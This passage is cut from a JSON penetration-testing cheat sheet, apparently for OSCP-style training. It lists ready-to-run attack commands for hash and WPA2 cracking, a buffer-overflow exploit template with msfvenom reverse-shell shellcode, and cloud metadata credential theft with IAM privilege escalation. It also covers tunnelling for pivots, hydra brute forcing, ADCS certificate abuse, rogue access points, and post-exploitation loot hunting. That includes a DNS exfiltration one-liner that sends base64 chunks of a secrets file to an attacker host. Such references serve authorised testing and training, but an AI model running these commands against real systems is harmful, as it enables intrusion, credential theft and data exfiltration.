                          "title": "bcrypt (3200)",
                          "command": "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "WPA2 (22000)",
                          "command": "hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Hashcat Strategies",
                  "commands": [
                      {
                          "title": "Dict + rules (BEST)",
                          "command": "hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      },
                      {
                          "title": "Hybrid list+mask",
                          "command": "hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d",
                          "tags": []
                      },
                      {
                          "title": "Mask 8-char",
                          "command": "hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a",
                          "tags": []
                      },
                      {
                          "title": "CeWL + crack",
                          "command": "cewl {URL} -w company.txt && hashcat -m 1000 hashes.txt company.txt -r /usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      },
                      {
                          "title": "Show cracked",
                          "command": "hashcat -m 1000 hashes.txt --show",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "John the Ripper",
                  "commands": [
                      {
                          "title": "John auto",
                          "command": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "Show cracked",
                          "command": "john hashes.txt --show",
                          "tags": []
                      },
                      {
                          "title": "ZIP crack",
                          "command": "zip2john archive.zip > zip.hash && john zip.hash --wordlist=rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "SSH key crack",
                          "command": "ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "bof",
          "label": "Buffer Overflow",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Fuzzing",
                  "commands": [
                      {
                          "title": "Pattern create",
                          "command": "msf-pattern_create -l 3000",
                          "tags": []
                      },
                      {
                          "title": "Pattern offset",
                          "command": "msf-pattern_offset -q DEADBEEF",
                          "tags": []
                      },
                      {
                          "title": "Python3 fuzzer",
                          "command": "python3 -c \"import socket; s=socket.socket(); s.connect(('{RHOST}',9999)); s.send(b'OVERFLOW1 ' + b'A'*2000); s.close()\"",
                          "tags": []
                      },
                      {
                          "title": "EIP control test",
                          "command": "python3 -c \"print('A'*OFFSET + 'B'*4 + 'C'*500)\"",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Badchars & JMP ESP",
                  "commands": [
                      {
                          "title": "Mona bytearray",
                          "command": "!mona bytearray -b '\\x00'",
                          "tags": []
                      },
                      {
                          "title": "Mona compare",
                          "command": "!mona compare -f C:\\mona\\BOF\\bytearray.bin -a ESP_ADDR",
                          "tags": []
                      },
                      {
                          "title": "Mona find JMP ESP",
                          "command": "!mona jmp -r esp -cpb '\\x00\\x0a\\x0d'",
                          "tags": []
                      },
                      {
                          "title": "JMP ESP opcode",
                          "command": "# FFE4 = JMP ESP",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Shellcode",
                  "commands": [
                      {
                          "title": "Msfvenom (no badchars)",
                          "command": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b '\\x00' -f py",
                          "tags": []
                      },
                      {
                          "title": "BoF exploit template",
                          "command": "import socket\nip='{RHOST}'; port=9999\nprefix=b'OVERFLOW1 '; offset=b'A'*OFFSET_NUM\nretn=b'\\xXX\\xXX\\xXX\\xXX'  # JMP ESP little endian\nnop=b'\\x90'*16; buf=b''  # paste msfvenom here\ns=socket.socket(); s.connect((ip,port))\ns.send(prefix+offset+retn+nop+buf); s.close()",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "misc",
          "label": "Misc / Reference",
          "group": "Post-Exploitation",
          "groups": [
              {
                  "title": "Quick Wins",
                  "commands": [
                      {
                          "title": "Linux network",
                          "command": "ip a && ip route && ss -tulnp",
                          "tags": []
                      },
                      {
                          "title": "Windows network",
                          "command": "ipconfig /all && netstat -ano",
                          "tags": []
                      },
                      {
                          "title": "Linux find passwords",
                          "command": "grep -r 'password\\|passwd\\|secret' /etc /home /var/www 2>/dev/null | grep -v Binary",
                          "tags": []
                      },
                      {
                          "title": "Windows find passwords",
                          "command": "findstr /si password *.txt *.xml *.config *.ini 2>nul",
                          "tags": []
                      },
                      {
                          "title": "Port check (bash)",
                          "command": "for p in 21 22 80 443 445 3389 8080; do (echo>/dev/tcp/{RHOST}/$p) 2>/dev/null && echo \"Port $p open\"; done",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Wordlists",
                  "commands": [
                      {
                          "title": "Rockyou",
                          "command": "/usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "SecLists dirs",
                          "command": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt",
                          "tags": []
                      },
                      {
                          "title": "SecLists usernames",
                          "command": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
                          "tags": []
                      },
                      {
                          "title": "Hashcat rules best64",
                          "command": "/usr/share/hashcat/rules/best64.rule",
                          "tags": []
                      },
                      {
                          "title": "Install SecLists",
                          "command": "sudo apt install seclists",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "cloud",
          "label": "Cloud Attacks",
          "group": "General",
          "groups": [
              {
                  "title": "AWS Recon & SSRF",
                  "commands": [
                      {
                          "title": "AWS metadata (SSRF)",
                          "command": "curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "AWS metadata IMDSv2",
                          "command": "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                          "tags": []
                      },
                      {
                          "title": "AWS - enumerate with stolen keys",
                          "command": "export AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...\naws sts get-caller-identity\naws s3 ls\naws iam list-users\naws iam list-attached-user-policies --user-name TARGET_USER",
                          "tags": []
                      },
                      {
                          "title": "AWS - list all S3 buckets",
                          "command": "aws s3 ls s3:// --recursive 2>/dev/null\naws s3 ls s3://bucket-name --recursive --human-readable",
                          "tags": []
                      },
                      {
                          "title": "AWS - S3 public bucket enum",
                          "command": "aws s3 ls s3://target-bucket --no-sign-request\naws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "AWS - IAM privesc (attach policy)",
                          "command": "aws iam attach-user-policy --user-name {USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "AWS - Lambda invoke",
                          "command": "aws lambda list-functions\naws lambda get-function --function-name TARGET_FUNC\naws lambda invoke --function-name TARGET_FUNC --payload '{}' out.txt",
                          "tags": []
                      },
                      {
                          "title": "AWS - secrets manager",
                          "command": "aws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id SECRET_NAME",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "AWS - SSM parameter dump",
                          "command": "aws ssm describe-parameters\naws ssm get-parameter --name /prod/db/password --with-decryption",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "Pacu (AWS exploitation fw)",
                          "command": "git clone https://github.com/RhinoSecurityLabs/pacu\ncd pacu && python3 pacu.py",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "Azure / Entra ID",
                  "commands": [
                      {
                          "title": "Azure metadata",
                          "command": "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'\ncurl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "Az CLI login + recon",
                          "command": "az login\naz account list\naz vm list -o table\naz storage account list -o table\naz keyvault list -o table",
                          "tags": []
                      },
                      {
                          "title": "Azure AD - enumerate users",
                          "command": "az ad user list --query '[].{UPN:userPrincipalName,Display:displayName}'\naz ad group list --query '[].displayName'",
                          "tags": []
                      },
                      {
                          "title": "Azure - storage blob enum",
                          "command": "az storage account list --query '[].name'\naz storage container list --account-name ACCT_NAME\naz storage blob list --container-name CONTAINER --account-name ACCT_NAME",
                          "tags": []
                      },
                      {
                          "title": "Azure - KeyVault secrets",
                          "command": "az keyvault secret list --vault-name VAULT_NAME\naz keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "ROADtools (Entra ID recon)",
                          "command": "roadrecon gather -u {USER}@{DOMAIN} -p '{PASS}'\nroadrecon gui",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "MicroBurst Azure enum",
                          "command": "Import-Module MicroBurst.psm1\nInvoke-EnumerateAzureBlobs -Base targetcorp\nInvoke-EnumerateAzureSubDomains -Base targetcorp",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "GCP",
                  "commands": [
                      {
                          "title": "GCP metadata",
                          "command": "curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/\ncurl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "GCP - list buckets",
                          "command": "gsutil ls\ngsutil ls -r gs://TARGET-BUCKET",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "GCP - download all from bucket",
                          "command": "gsutil -m cp -r gs://TARGET-BUCKET /tmp/exfil",
                          "tags": []
                      },
                      {
                          "title": "GCP - IAM policies",
                          "command": "gcloud iam service-accounts list\ngcloud projects get-iam-policy PROJECT_ID",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "pivot",
          "label": "Pivoting / Tunnels",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "SSH Tunneling",
                  "commands": [
                      {
                          "title": "SSH local port forward",
                          "command": "ssh -L LOCAL_PORT:{RHOST}:REMOTE_PORT user@JUMP_HOST -N\n# Access: localhost:LOCAL_PORT -> RHOST:REMOTE_PORT",
                          "tags": []
                      },
                      {
                          "title": "SSH remote port forward",
                          "command": "ssh -R RPORT:localhost:{LPORT} user@{LHOST} -N\n# Expose your local port on remote server",
                          "tags": []
                      },
                      {
                          "title": "SSH dynamic SOCKS5",
                          "command": "ssh -D 1080 user@JUMP_HOST -N\n# Then: proxychains nmap ... or set proxy in Burp",
                          "tags": []
                      },
                      {
                          "title": "SSH -J jump host",
                          "command": "ssh -J user@JUMP_HOST user@{RHOST}\n# Multi-hop: ssh -J jump1,jump2 user@target",
                          "tags": []
                      },
                      {
                          "title": "SSH ProxyJump config",
                          "command": "# ~/.ssh/config:\nHost target\n  HostName {RHOST}\n  User root\n  ProxyJump jump_user@JUMP_HOST",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Chisel",
                  "commands": [
                      {
                          "title": "Chisel server (attacker)",
                          "command": "./chisel server -p 8888 --reverse --socks5",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "Chisel client -> SOCKS (victim)",
                          "command": "./chisel client {LHOST}:8888 R:socks",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "Chisel - specific port forward",
                          "command": "# Attacker: ./chisel server -p 8888 --reverse\n# Victim: ./chisel client {LHOST}:8888 R:8080:INTERNAL_HOST:8080",
                          "tags": []
                      },
                      {
                          "title": "proxychains config",
                          "command": "# /etc/proxychains4.conf - add:\nsocks5 127.0.0.1 1080\n# Usage: proxychains nmap -sT -p 80,443 {RHOST}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Ligolo-ng",
                  "commands": [
                      {
                          "title": "Ligolo server (attacker)",
                          "command": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Ligolo agent (victim)",
                          "command": "./agent -connect {LHOST}:11601 -ignore-cert",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Ligolo - add route",
                          "command": "# In ligolo console after session:\nip route add 192.168.1.0/24 dev ligolo\n# Then: start",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "Metasploit Pivoting",
                  "commands": [
                      {
                          "title": "Route via session",
                          "command": "# In msfconsole:\nroute add 192.168.1.0/24 SESSION_ID\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24",
                          "tags": []
                      },
                      {
                          "title": "Socks proxy via MSF",
                          "command": "use auxiliary/server/socks_proxy\nset SRVPORT 1080; set VERSION 5; run -j\n# Then use proxychains",
                          "tags": []
                      },
                      {
                          "title": "Port forward via MSF",
                          "command": "portfwd add -l 8080 -p 80 -r INTERNAL_IP",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Socat & Netcat Relay",
                  "commands": [
                      {
                          "title": "Socat port relay",
                          "command": "socat TCP-LISTEN:8080,fork TCP:{RHOST}:80",
                          "tags": []
                      },
                      {
                          "title": "Socat double relay (pivot box)",
                          "command": "# On pivot:\nsocat TCP-LISTEN:4444,fork TCP:{LHOST}:4444\n# On victim: connect to pivot:4444 (reaches attacker)",
                          "tags": []
                      },
                      {
                          "title": "Netcat relay (no socat)",
                          "command": "mkfifo /tmp/r\nnc -lvp 4444 < /tmp/r | nc NEXT_HOP 4444 > /tmp/r",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "plink / Windows Tunnel",
                  "commands": [
                      {
                          "title": "plink SSH local fwd",
                          "command": "plink.exe -L LOCAL_PORT:{RHOST}:REMOTE_PORT user@{LHOST} -pw '{PASS}'",
                          "tags": []
                      },
                      {
                          "title": "plink SSH dynamic",
                          "command": "plink.exe -D 1080 user@{LHOST} -pw '{PASS}'",
                          "tags": []
                      },
                      {
                          "title": "netsh port proxy",
                          "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "passatk",
          "label": "Password Attacks",
          "group": "Post-Exploitation",
          "groups": [
              {
                  "title": "Hydra Online Brute",
                  "commands": [
                      {
                          "title": "SSH brute",
                          "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {RHOST} ssh -t 4",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "SSH with user list",
                          "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {RHOST} ssh -t 4",
                          "tags": []
                      },
                      {
                          "title": "FTP brute",
                          "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {RHOST} ftp",
                          "tags": []
                      },
                      {
                          "title": "RDP brute",
                          "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt rdp://{RHOST} -t 1",
                          "tags": []
                      },
                      {
                          "title": "SMB brute",
                          "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt smb://{RHOST}",
                          "tags": []
                      },
                      {
                          "title": "HTTP POST form",
                          "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {RHOST} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'",
                          "tags": []
                      },
                      {
                          "title": "HTTP Basic Auth",
                          "command": "hydra -l admin -P rockyou.txt {RHOST} http-get /admin/",
                          "tags": []
                      },
                      {
                          "title": "MSSQL brute",
                          "command": "hydra -l sa -P rockyou.txt {RHOST} mssql",
                          "tags": []
                      },
                      {
                          "title": "MySQL brute",
                          "command": "hydra -l root -P rockyou.txt {RHOST} mysql",
                          "tags": []
                      },
                      {
                          "title": "WinRM brute",
                          "command": "hydra -l {USER} -P rockyou.txt {RHOST} winrm",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Medusa & Ncrack",
                  "commands": [
                      {
                          "title": "Medusa SSH",
                          "command": "medusa -h {RHOST} -u {USER} -P /usr/share/wordlists/rockyou.txt -M ssh",
                          "tags": []
                      },
                      {
                          "title": "Medusa multi-host",
                          "command": "medusa -H hosts.txt -u {USER} -P rockyou.txt -M ssh -t 5",
                          "tags": []
                      },
                      {
                          "title": "Ncrack RDP",
                          "command": "ncrack -vv --user {USER} -P rockyou.txt rdp://{RHOST}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Password Mutation & Wordlists",
                  "commands": [
                      {
                          "title": "Crunch - charset mask",
                          "command": "crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt",
                          "tags": []
                      },
                      {
                          "title": "Crunch - pattern",
                          "command": "crunch 10 10 -t Corp@@@@@@ -o corp_words.txt\n# @ = lowercase, , = uppercase, % = digit, ^ = special",
                          "tags": []
                      },
                      {
                          "title": "Mentalist / CUPP",
                          "command": "cupp -i  # interactive - generates targeted wordlist from victim info",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Rule-based mutations",
                          "command": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule base_words.txt > mutated.txt",
                          "tags": []
                      },
                      {
                          "title": "Username gen from name",
                          "command": "username-anarchy --input-file names.txt -f first.last,first,f.last > users.txt",
                          "tags": []
                      },
                      {
                          "title": "CeWL targeted",
                          "command": "cewl {URL} -d 4 -m 5 --with-numbers -w cewl.txt",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Default & Common Creds",
                  "commands": [
                      {
                          "title": "admin:admin - quick check",
                          "command": "curl -s -u admin:admin http://{RHOST}/\ncurl -s -u admin:password http://{RHOST}/\ncurl -s -u admin:'' http://{RHOST}/",
                          "tags": []
                      },
                      {
                          "title": "Common default list",
                          "command": "# Try: admin:admin, admin:password, admin:12345\n# root:root, root:toor, root:password\n# guest:guest, test:test, user:user",
                          "tags": []
                      },
                      {
                          "title": "Printer defaults",
                          "command": "# Ricoh: admin:'' | HP JetDirect: admin:password | Xerox: admin:1111",
                          "tags": []
                      },
                      {
                          "title": "Network device defaults",
                          "command": "# Cisco: cisco:cisco | Juniper: root:'' | Fortinet: admin:''",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "osint",
          "label": "OSINT / Ext Recon",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Domain & DNS OSINT",
                  "commands": [
                      {
                          "title": "WHOIS",
                          "command": "whois {DOMAIN}\nwhois {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "DNS all records",
                          "command": "dig {DOMAIN} ANY +noall +answer\ndig {DOMAIN} A AAAA MX NS TXT SOA",
                          "tags": []
                      },
                      {
                          "title": "DNS brute (massdns)",
                          "command": "massdns -r resolvers.txt -t A -o S subdomains.txt > dns_results.txt",
                          "tags": []
                      },
                      {
                          "title": "Subfinder",
                          "command": "subfinder -d {DOMAIN} -all -recursive -o subs.txt",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Amass passive enum",
                          "command": "amass enum -passive -d {DOMAIN} -o amass_out.txt",
                          "tags": []
                      },
                      {
                          "title": "Amass active enum",
                          "command": "amass enum -active -d {DOMAIN} -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                          "tags": []
                      },
                      {
                          "title": "theHarvester",
                          "command": "theHarvester -d {DOMAIN} -b all -l 500 -f harvester_out.html",
                          "tags": []
                      },
                      {
                          "title": "Certificate transparency",
                          "command": "curl -s 'https://crt.sh/?q=%25.{DOMAIN}&output=json' | python3 -m json.tool | grep name_value | sort -u",
                          "tags": []
                      },
                      {
                          "title": "Reverse IP lookup",
                          "command": "curl -s https://api.hackertarget.com/reverseiplookup/?q={RHOST}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Google Dorks",
                  "commands": [
                      {
                          "title": "Login pages",
                          "command": "site:{DOMAIN} inurl:login OR inurl:signin OR inurl:admin",
                          "tags": []
                      },
                      {
                          "title": "Exposed config files",
                          "command": "site:{DOMAIN} ext:xml OR ext:conf OR ext:env OR ext:ini",
                          "tags": []
                      },
                      {
                          "title": "Sensitive files",
                          "command": "site:{DOMAIN} ext:pdf OR ext:doc OR ext:xls filetype:pdf",
                          "tags": []
                      },
                      {
                          "title": "Directory listings",
                          "command": "site:{DOMAIN} intitle:\"index of\"",
                          "tags": []
                      },
                      {
                          "title": "Exposed phpinfo",
                          "command": "site:{DOMAIN} intitle:\"phpinfo()\"",
                          "tags": []
                      },
                      {
                          "title": "Git exposure",
                          "command": "site:{DOMAIN} inurl:.git",
                          "tags": []
                      },
                      {
                          "title": "SQL errors",
                          "command": "site:{DOMAIN} intext:\"sql syntax\" OR intext:\"mysql_fetch\"",
                          "tags": []
                      },
                      {
                          "title": "AWS S3 buckets",
                          "command": "site:s3.amazonaws.com {DOMAIN}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Shodan / External Recon",
                  "commands": [
                      {
                          "title": "Shodan host lookup",
                          "command": "shodan host {RHOST}  # requires API key",
                          "tags": []
                      },
                      {
                          "title": "Shodan search org",
                          "command": "shodan search 'org:\"Target Corp\" http.title:\"Login\"'",
                          "tags": []
                      },
                      {
                          "title": "httprobe (live hosts)",
                          "command": "cat subs.txt | httprobe -c 50 -t 3000 > live_hosts.txt",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "httpx (probe + info)",
                          "command": "cat subs.txt | httpx -silent -title -status-code -tech-detect -o httpx_out.txt",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Nuclei template scan",
                          "command": "nuclei -l live_hosts.txt -t /path/to/nuclei-templates/ -severity high,critical -o nuclei_out.txt",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "waybackurls - historical",
                          "command": "waybackurls {DOMAIN} | sort -u | tee wayback.txt",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "gau - all URLs",
                          "command": "gau {DOMAIN} | tee gau_urls.txt",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "Email & Credential OSINT",
                  "commands": [
                      {
                          "title": "Hunter.io - emails",
                          "command": "# curl 'https://api.hunter.io/v2/domain-search?domain={DOMAIN}&api_key=KEY'",
                          "tags": []
                      },
                      {
                          "title": "H8mail - breach search",
                          "command": "h8mail -t {DOMAIN} --chase --leak-lookup",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "LinkedIn scrape (dork)",
                          "command": "site:linkedin.com/in/ \"{DOMAIN}\"",
                          "tags": []
                      },
                      {
                          "title": "Dehashed search",
                          "command": "# https://dehashed.com - search email, domain, username, IP",
                          "tags": []
                      },
                      {
                          "title": "Breach parse (haveibeenpwned API)",
                          "command": "curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/TARGET@{DOMAIN}' -H 'hibp-api-key: KEY'",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "adcerts",
          "label": "AD Certs (ADCS)",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "ADCS Enumeration",
                  "commands": [
                      {
                          "title": "Certipy - find all vulns",
                          "command": "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
                          "tags": [
                              "new",
                              "high"
                          ]
                      },
                      {
                          "title": "Certutil - list CAs",
                          "command": "certutil -TCAInfo\ncertutil -config - -ping",
                          "tags": []
                      },
                      {
                          "title": "Get-ADCSTemplate (PS)",
                          "command": "Get-ADObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' -Filter {objectClass -like 'pKICertificateTemplate'} -Properties * | select name,mspki-certificate-name-flag",
                          "tags": []
                      },
                      {
                          "title": "Enumerate via LDAP",
                          "command": "ldapsearch -x -H ldap://{DC} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local'",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "ESC1 - Enrollee Supplies SAN",
                  "commands": [
                      {
                          "title": "ESC1 request admin cert",
                          "command": "certipy req -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -target ca01.{DOMAIN} -template VulnerableTemplate -upn administrator@{DOMAIN}",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "Certipy auth with cert",
                          "command": "certipy auth -pfx administrator.pfx -domain {DOMAIN} -username administrator -dc-ip {DC}",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "ESC4 - Vulnerable Template ACL",
                  "commands": [
                      {
                          "title": "ESC4 overwrite template",
                          "command": "certipy template -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -template VulnTemplate -save-old",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "ESC4 -> request as admin",
                          "command": "certipy req -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {DC} -target ca01.{DOMAIN} -template VulnTemplate -upn administrator@{DOMAIN}",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "ESC8 - NTLM Relay to ADCS HTTP",
                  "commands": [
                      {
                          "title": "ntlmrelayx to ADCS",
                          "command": "impacket-ntlmrelayx -t http://ca01.{DOMAIN}/certsrv/certfnsh.asp --adcs --template DomainController",
                          "tags": [
                              "crit",
                              "new"
                          ]
                      },
                      {
                          "title": "Coerce + relay -> cert",
                          "command": "# Trigger coerce on DC:\npython3 PetitPotam.py -u {USER} -p '{PASS}' {LHOST} {DC}\n# ntlmrelayx catches and gets DC cert",
                          "tags": [
                              "crit",
                              "new"
                          ]
                      },
                      {
                          "title": "PKINITtools - cert to TGT",
                          "command": "python3 gettgtpkinit.py {DOMAIN}/{USER} user.pfx user.ccache\nexport KRB5CCNAME=user.ccache\npython3 getnthash.py {DOMAIN}/{USER} -k",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              }
          ]
      },
      {
          "id": "wifi",
          "label": "Wireless Attacks",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "WPA2 Capture & Crack",
                  "commands": [
                      {
                          "title": "Monitor mode",
                          "command": "airmon-ng start wlan0\n# OR: ip link set wlan0 down; iw wlan0 set monitor control; ip link set wlan0 up",
                          "tags": []
                      },
                      {
                          "title": "Scan APs",
                          "command": "airodump-ng wlan0mon",
                          "tags": []
                      },
                      {
                          "title": "Capture 4-way handshake",
                          "command": "airodump-ng -c CH --bssid BSSID -w capture wlan0mon",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "Deauth clients (force reconnect)",
                          "command": "aireplay-ng --deauth 10 -a BSSID -c CLIENT_MAC wlan0mon",
                          "tags": []
                      },
                      {
                          "title": "Crack WPA2 - hashcat",
                          "command": "hcxpcapngtool capture.cap -o capture.hc22000\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "PMKID attack (no deauth)",
                          "command": "hcxdumptool -o pmkid.hc22000 -i wlan0mon --enable_status=1\nhashcat -m 22000 pmkid.hc22000 rockyou.txt",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "WPA2-Enterprise / PEAP",
                  "commands": [
                      {
                          "title": "Capture identity",
                          "command": "hostapd-wpe hostapd-wpe.conf  # rogue AP captures MSCHAPv2",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "Crack NTLMv2 from PEAP",
                          "command": "hashcat -m 5600 peap_hash.txt rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "Eaphammer (rogue AP)",
                          "command": "python3 eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid TARGET_SSID --creds",
                          "tags": [
                              "new",
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "Evil Twin / MITM",
                  "commands": [
                      {
                          "title": "hostapd-wpe rogue AP",
                          "command": "# Create WPA2-Enterprise rogue AP to harvest MSCHAPv2 creds\nhostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
                          "tags": []
                      },
                      {
                          "title": "Bettercap WiFi",
                          "command": "bettercap -iface wlan0\n# In bettercap: wifi.recon on; wifi.ap on",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "postex",
          "label": "Post-Exploit / Loot",
          "group": "Post-Exploitation",
          "groups": [
              {
                  "title": "Linux Loot & Data Exfil",
                  "commands": [
                      {
                          "title": "Database credentials hunt",
                          "command": "grep -rn 'password\\|passwd\\|db_pass\\|DB_PASS\\|mysqli\\|PDO' /var/www /opt /srv 2>/dev/null | grep -v Binary | grep -v '.pyc'",
                          "tags": []
                      },
                      {
                          "title": "Config file secrets",
                          "command": "find / -name '*.env' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' 2>/dev/null | xargs grep -l 'password\\|secret\\|key' 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "SSH private keys - all users",
                          "command": "find /home /root /etc/ssh -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "Browser creds (Linux)",
                          "command": "ls ~/.mozilla/firefox/*.default*/logins.json\n# Decrypt: python3 firefox_decrypt.py",
                          "tags": []
                      },
                      {
                          "title": "Mail / email files",
                          "command": "find /var/mail /home -name '*.mbox' -o -name 'Maildir' 2>/dev/null | head -20",
                          "tags": []
                      },
                      {
                          "title": "Exfil via DNS (air-gapped)",
                          "command": "# Small data: for chunk in $(cat secret.txt | base64 | fold -w40); do dig $chunk.{LHOST}; done",
                          "tags": []
                      },
                      {
